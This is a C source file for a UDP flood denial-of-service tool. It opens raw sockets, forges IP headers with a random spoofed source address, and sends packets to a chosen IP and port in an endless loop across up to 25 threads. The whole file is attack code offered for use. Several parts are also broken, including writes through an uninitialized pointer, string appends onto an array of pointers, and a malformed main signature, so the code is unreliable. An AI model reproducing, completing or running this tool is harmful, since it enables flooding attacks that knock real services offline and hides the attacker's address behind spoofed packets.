#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <stdbool.h>
#include <pthread.h>
#include <netinet/udp.h> 
#include <netinet/ip.h>  
#include <time.h>


#define BUFFER 1024
#define USAGE_MESSAGE "./udp [IP] [PORT] [1024] [TIME] [THREADS] [RPC]"
#define FAILURE_EXIT -1
#define SUCCESS_EXIT 1
#define DEBUGGING 1

struct SOCKET_SEND_DATA
{
    char* ip_addr;
    int thread_count;
    char* source_ip;
    int time;
    int port;
    int psize;
    int rpc;
};

struct sockaddr_in s_in;

unsigned short csum(unsigned short *buf, int nwords);
bool verify_struct(struct SOCKET_SEND_DATA sock_data);
bool cargs(int* argc, char* argv[]);
void* attack_thr(void* data);
int glen(char st[]);
char datagram[4096];

bool verify_struct(struct SOCKET_SEND_DATA sock_data){
    return(
        sock_data.port > 0 && sock_data.port <= 65535 &&
        sock_data.thread_count <= 25 && sock_data.thread_count >= 1 &&
        sock_data.time > 9 && sock_data.time <= 4000 &&
        sock_data.psize <= 1024 && sock_data.psize >= 25 &&
        sock_data.rpc > 0 && sock_data.rpc < 100
    );
}


int glen(char st[]){
    int c=0;
    while(st[c] != '\0'){
        c++;
    }
    return c;
}

unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

bool cargs(int* argc, char* argv[]){
    int i;
    for(i=2;i<argc;i++){
        int y = glen(argv[i]);
        int z;
        for(z=0;z<y;z++){
            if(!isdigit(argv[i][z])){
                return false;
            }
        }           
    }
    return true;
}

void* attack_thr(void* data){

    struct SOCKET_SEND_DATA *args = (struct SOCKET_SEND_DATA *)data;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    
    if(sock < 0){
        perror("Failure creating socket");
    }

    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);

    s_in.sin_family = AF_INET;
    s_in.sin_port = htons(args->port);
    s_in.sin_addr.s_addr = inet_addr(args->ip_addr);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data);
    iph->id = htonl(1337); 
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(args->source_ip); 
    iph->daddr = s_in.sin_addr.s_addr; 

    iph->check = csum(datagram, iph->tot_len);
    int i = 1;
    const int *j = &i;

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, j, sizeof(i)) < 0)
    {
      perror("Error setting IP_HDRINCL");
      printf("Error code: %d\n", errno);
      exit(EXIT_FAILURE);
    }

    while(true){
        if(sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&s_in, sizeof(s_in)) < 0 && DEBUGGING)
        {
            perror("Sent failure.");
        }
    }
}

int main(int* argc, char* argv[]){ // [IP] [PORT] [PSIZE] [TIME] [THREADS] [RPC] 
    srand(time(0));

    char* temp;
    char* RANDOM_SOURCE_IP[4];

    sprintf(temp, "%d", rand() % 250);
    strcat(RANDOM_SOURCE_IP, temp);

    for(int i = 1; i < 4; i++){
        sprintf(temp, ".%d", rand() % 250);
        strcat(RANDOM_SOURCE_IP, temp);
    }


    if (argc != 7) {
        printf(USAGE_MESSAGE);
        return 0;
    }

    struct sockaddr_in sa;
    char* IP_ADDR = argv[1];
    int result = inet_pton(AF_INET, IP_ADDR, (&sa.sin_addr));

    if (result != 0 && cargs(argc, argv)){

        struct SOCKET_SEND_DATA data;
        
        data.ip_addr = IP_ADDR;
        data.port = atoi(argv[2]);
        data.psize = atoi(argv[3]);
        data.time = atoi(argv[4]);
        data.thread_count = atoi(argv[5]);
        data.rpc = atoi(argv[6]);
        data.source_ip = RANDOM_SOURCE_IP;
        
        if (verify_struct(data)){
            int i;
            for(i=0;i<data.thread_count;i++){
                pthread_t thread_id;
                if (pthread_create(&thread_id, NULL, &attack_thr, (void*)&data) == 0){
                    if(DEBUGGING){
                        printf("\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37m Started thread \033[1;32m%d\033[1;37m\n", i+1);
                    }
                }else{
                    printf("Failure starting thread %d",i);
                }
            }
        }else{
            printf("failure");
            return FAILURE_EXIT;
        }
    }
    else{
        return FAILURE_EXIT;
    }
    sleep(atoi(argv[4]));
    return SUCCESS_EXIT;
}